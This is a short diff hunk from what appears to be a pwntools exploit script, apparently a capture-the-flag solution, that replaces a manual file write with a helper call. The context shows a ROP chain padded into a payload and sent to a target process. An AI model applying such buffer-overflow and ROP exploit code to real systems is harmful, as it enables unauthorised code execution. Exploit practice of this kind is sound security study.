@@ -25,8 +25,7 @@ print(rop.chain())
 payload = fit({padding: rop.chain()})
 
 # Save payload to file
-f = open("payload", "wb")
-f.write(payload)
+write("payload", payload)
 
 # PWN
 p.sendlineafter('>', payload)
